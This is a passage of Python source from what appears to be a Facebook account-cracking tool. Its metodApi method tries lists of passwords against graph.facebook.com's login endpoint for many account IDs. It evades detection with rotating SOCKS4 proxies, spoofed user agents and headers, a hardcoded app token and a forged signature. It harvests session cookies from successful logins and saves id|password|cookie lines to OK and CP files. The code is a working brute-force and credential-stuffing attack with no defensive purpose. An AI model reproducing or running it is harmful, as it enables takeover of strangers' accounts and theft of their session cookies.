          statuscok = f'{UN}{kuki}{BMM}'
          tree.add(statusth).add(statusok).add(statuscok)
          gubluk_print(tree)
          open('OK/'+okNdyZ,'a').write(idf+'|'+pw+'|'+kuki+'\n')
          break
        else:
          continue
      except requests.exceptions.ConnectionError:
        time.sleep(31)
    self.loop+=1
  
  # metode api
  def metodApi(self, idf, pwv):
    ua = random.choice(ugen2)
    prog.update(des,description=f"[bold purple]{idf}[bold white] {self.loop}/{len(id)} OK-:[bold purple]{self.ok}[/] CP-:[bold yellow]{self.cp}[/]")
    prog.advance(des)
    for pw in pwv:
      try:
        if 'ya' in ualuh:ua = ualu[0]
        if 'ya' in uafl:ua = random.choice(myugen)
        nip=random.choice(prox)
        proxs= {'http': 'socks4://'+nip}
        ses = requests.Session()
        params = {"access_token":"200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16","format":"JSON","sdk_version":{random.randrange(2, 31)},"email":idf,"locale":"id_ID","password":pw,"sdk":"android","generate_session_cookies":"1","sig":f"{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}"}
        head = {"Host":"graph.facebook.com","x-fb-connection-bandwidth":repr(random.randint(2e7, 3e7)),"x-fb-sim-hni":repr(random.randint(2e4, 4e4)),"x-fb-net-hni":repr(random.randint(2e4, 4e4)),"x-fb-connection-quality":"EXCELLENT","user-agent":ua,"content-type":"application/x-www-form-urlencoded","x-fb-http-engine":"Liger"}
        po = ses.post("https://graph.facebook.com/auth/login", params=params, headers=head, allow_redirects=False)
        if "www.facebook.com" in po.text:
          self.cp+=1
          tree = Tree(f"{BMM} ")
          statusth = f'{ME}{self.tahun(idf)}{BMM}'
          statuscp = f'{KT}{idf}|{pw}{BMM}'
          tree.add(statusth).add(statuscp)
          gubluk_print(tree)
          open('CP/'+cpNdyZ,'a').write(idf+'|'+pw+'|'+ua+'\n')
          akun.append(idf+'|'+pw)
          break
        elif 'session_key' in po.text:
          self.ok+=1
          cok = {}
          ngeng = json.loads(po.text)
          coki = ngeng["session_cookies"]
          for x in coki:
              cok.update({x["name"]:x["value"]})
          kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
          tree = Tree(f"{BMM} ")
          statusth = f'{ME}{self.tahun(idf)}{BMM}'
          statusok = f'{HI}{idf}|{pw}{BMM}'
          statuscok = f'{UN}{kuki}{BMM}'
          tree.add(statusth).add(statusok).add(statuscok)
          gubluk_print(tree)
          open('OK/'+okNdyZ,'a').write(idf+'|'+pw+'|'+kuki+'\n')
          break
        else:
          continue
      except requests.exceptions.ConnectionError:
        time.sleep(31)
    self.loop+=1

# run
if __name__=='__main__':
  try:subprocess.check_output(["ping", "-c", "1", "m.facebook.com"])
  except:print('\x1b[1;91mcheck your connection and try again');exit()
  try:os.mkdir('DUMP-NdyZz')
  except:pass
  try:os.mkdir('UA-ME')
  except:pass
  try:os.mkdir('OK')
  except:pass
  try:os.mkdir('CP')
  except:pass
  try:os.system('touch .prox.txt')
  except:pass
  try:os.system('clear')
  except:pass
  Facebook()